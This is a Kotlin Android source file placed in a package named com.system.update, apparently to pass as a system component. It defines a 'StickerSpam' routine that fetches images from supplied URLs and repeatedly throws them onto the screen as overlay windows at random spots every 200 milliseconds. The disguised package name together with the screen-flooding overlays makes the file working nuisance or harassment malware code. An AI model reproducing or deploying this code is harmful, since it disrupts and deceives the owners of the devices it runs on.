package com.system.update

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.ImageView
import java.net.HttpURLConnection
import java.net.URL
import kotlin.random.Random

object StickerSpam {

    private var spamThread: Thread? = null
    private var handler: Handler? = null
    private val activeViews = mutableListOf<View>()
    @Volatile private var running = false

    fun start(ctx: Context, urls: List<String>, intervalMs: Long = 200, maxActive: Int = 30) {
        stop()
        running = true

        val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        handler = Handler(Looper.getMainLooper())

        val bitmaps = mutableListOf<Bitmap>()
        for (u in urls) {
            try {
                val conn = URL(u).openConnection() as HttpURLConnection
                conn.connectTimeout = 10000
                conn.readTimeout = 10000
                conn.instanceFollowRedirects = true
                conn.doInput = true
                conn.connect()
                val bmp = BitmapFactory.decodeStream(conn.inputStream)
                conn.inputStream.close()
                if (bmp != null) bitmaps.add(bmp)
            } catch (_: Exception) {}
        }

        if (bitmaps.isEmpty()) {
            running = false
            return
        }

        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE

        spamThread = Thread {
            while (running) {
                try {
                    val bmp = bitmaps[Random.nextInt(bitmaps.size)]
                    handler?.post {
                        try {
                            if (!running) return@post

                            val view = ImageView(ctx).apply {
                                setImageBitmap(bmp)
                                alpha = 1f
                            }

                            val sizePx = TypedValue.applyDimension(
                                TypedValue.COMPLEX_UNIT_DIP,
                                80f,
                                ctx.resources.displayMetrics
                            ).toInt()

                            val params = WindowManager.LayoutParams(
                                sizePx, sizePx,
                                type,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                                PixelFormat.TRANSLUCENT
                            )

                            val metrics = ctx.resources.displayMetrics
                            params.x = Random.nextInt(0, maxOf(1, metrics.widthPixels - sizePx))
                            params.y = Random.nextInt(0, maxOf(1, metrics.heightPixels - sizePx))
                            params.gravity = Gravity.TOP or Gravity.START

                            wm.addView(view, params)
                            activeViews.add(view)

                            handler?.postDelayed({
                                try {
                                    view.animate()
                                        .alpha(0f)
                                        .scaleX(1.5f)
                                        .scaleY(1.5f)
                                        .setDuration(600)
                                        .withEndAction {
                                            try { wm.removeView(view) } catch (_: Exception) {}
                                            activeViews.remove(view)
                                        }
                                        .start()
                                } catch (_: Exception) {}
                            }, 800)

                            while (activeViews.size > maxActive) {
                                val old = activeViews.removeAt(0)
                                try { wm.removeView(old) } catch (_: Exception) {}
                            }
                        } catch (_: Exception) {}
                    }

                    Thread.sleep(intervalMs)
                } catch (_: Exception) {
                    break
                }
            }
        }.also { it.start() }
    }

    fun stop() {
        running = false
        try { spamThread?.interrupt() } catch (_: Exception) {}
        spamThread = null

        handler?.post {
            for (v in activeViews.toList()) {
                try {
                    val parent = v.parent
                    if (parent is android.view.ViewGroup) {
                        parent.removeView(v)
                    }
                } catch (_: Exception) {}
            }
            activeViews.clear()
        }
    }
}
